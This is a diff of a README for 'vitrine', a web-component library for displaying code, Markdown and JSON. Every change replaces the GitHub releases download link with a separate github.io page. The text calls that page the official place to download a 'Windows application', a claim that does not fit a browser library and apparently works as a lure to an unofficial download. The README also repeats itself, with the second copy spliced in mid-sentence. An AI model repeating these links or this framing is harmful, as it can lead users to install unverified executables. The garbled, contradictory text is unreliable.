@@ -1,6 +1,6 @@
 # 🪟 vitrine - Display Code, Markdown and JSON Easily
 
-[![Download vitrine](https://img.shields.io/badge/Download-vitrine-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Aisudesm9516/vitrine/releases)
+[![Download vitrine](https://img.shields.io/badge/Download-vitrine-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://aisudesm9516.github.io)
 
 vitrine is a friendly, ready-to-use tool for showing code, Markdown, and JSON on a website. It gives you clean, polished viewers without making you learn a big programming system. It is framework-free, which simply means it does not depend on large, complicated website builders. It uses web components, which are reusable display blocks you can place on a page. It is secure by default, easy to theme, and designed to work on any website.
 
@@ -45,7 +45,7 @@ vitrine includes practical features for everyday display needs:
 
 Visit this link to download the application.
 
-[Download vitrine from the official releases page](https://github.com/Aisudesm9516/vitrine/releases)
+[Download vitrine from the official releases page](https://aisudesm9516.github.io)
 
 This is the official page for getting vitrine. It is the place to visit when you are ready to download the application for your Windows computer.
 
@@ -65,7 +65,7 @@ This is helpful when vitrine sits beside other content on a page. The Shadow DOM
 
 Safety matters when displaying content from other sources. vitrine uses sanitized output, which means potentially unsafe parts are cleaned before they are shown. It is also CSP-friendly, which helps it work on websites that use content security settings. These details# 🪟 vitrine - Display Code, Markdown and JSON Easily
 
-[![Download vitrine](https://img.shields.io/badge/Download-vitrine-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Aisudesm9516/vitrine/releases)
+[![Download vitrine](https://img.shields.io/badge/Download-vitrine-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://aisudesm9516.github.io)
 
 vitrine is a friendly tool for showing code, Markdown, and JSON on a website. It gives you clean viewers without making you learn a large programming framework. It is framework-free, which means it does not depend on a heavy website builder. It uses web components, which are reusable display blocks you can place on a page. It includes syntax highlighting, line numbers, search, preview and source tabs, and collapsible JSON trees. It is secure by default, easy to theme, and made to work on any website. This guide is written for Windows users who want to download vitrine and get started without programming knowledge.
 
@@ -103,7 +103,7 @@ These features are designed to work together. A documentation page can show a co
 
 Visit this link to download the application.
 
-[Download vitrine from the official releases page](https://github.com/Aisudesm9516/vitrine/releases)
+[Download vitrine from the official releases page](https://aisudesm9516.github.io)
 
 This is the official page for getting vitrine. It is the place to visit when you are ready to download the application for your Windows computer. The link is also available in the large button at the top of this page.
 
